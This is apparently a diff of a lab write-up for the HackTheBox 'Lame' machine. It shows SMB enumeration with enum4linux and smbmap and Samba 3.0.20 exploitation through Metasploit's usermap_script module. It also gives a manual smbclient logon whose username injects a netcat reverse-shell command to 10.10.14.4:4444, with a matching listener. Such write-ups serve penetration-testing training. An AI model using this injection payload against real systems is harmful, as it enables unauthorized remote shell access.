@@ -26,11 +26,14 @@ msfconsole
 
 
 Yes, indeed this is a banner so it wont work!!
+
 ![lame3](https://user-images.githubusercontent.com/15195048/93902145-17144400-fcac-11ea-995f-560d1a312769.png)
 
 ## 2.Enumerating SMB on port 139 & 445
 
 **1.enum4linux -a 10.10.10.3**
+
+
 ![lame4](https://user-images.githubusercontent.com/15195048/93902146-17144400-fcac-11ea-94fd-1935c5c21b4f.png)
 
 
@@ -49,16 +52,17 @@ client min protocol = NT1
 That allows smbclient to work against SMBv1 shares.
 
 **3.smbmap -H 10.10.10.3**
+
  ![lame5](https://user-images.githubusercontent.com/15195048/93902150-17acda80-fcac-11ea-995a-4a4b2e36e4ec.png)
 
  
-
 # Privilege Escalation no1
 
 # A)Metasploit
 Metasploit
 msf5 > search samba 3.0.20
 use exploit/multi/samba/usermap_script
+
 ![lame6](https://user-images.githubusercontent.com/15195048/93902152-18457100-fcac-11ea-99c5-18f7cbc424e5.png)
 
 **Rooted**
@@ -67,11 +71,13 @@ use exploit/multi/samba/usermap_script
 
 smbclient 10.10.10.3/tmp
 smb>logon "/=`nohup nc -nv 10.10.14.4 4444 -e /bin/sh`"
+
 ![lame7](https://user-images.githubusercontent.com/15195048/93902155-18457100-fcac-11ea-998a-1cd80ce0c314.png)
 
 
 **Attacker:** 
 nc -lvpn 4444
+
 ![lame8](https://user-images.githubusercontent.com/15195048/93902156-18de0780-fcac-11ea-9708-2af75de533b0.png)
 
 **Rooted**
@@ -98,6 +104,7 @@ nc -lnvp 9999
 -----------------------------------------------------------------------------------------------------------------------------------
 # Privilege Escalation no2
 Enumerating port 3621 (distccd)
+
 ![lame9](https://user-images.githubusercontent.com/15195048/93902157-18de0780-fcac-11ea-9d38-70413e9d14dd.png)
 
  
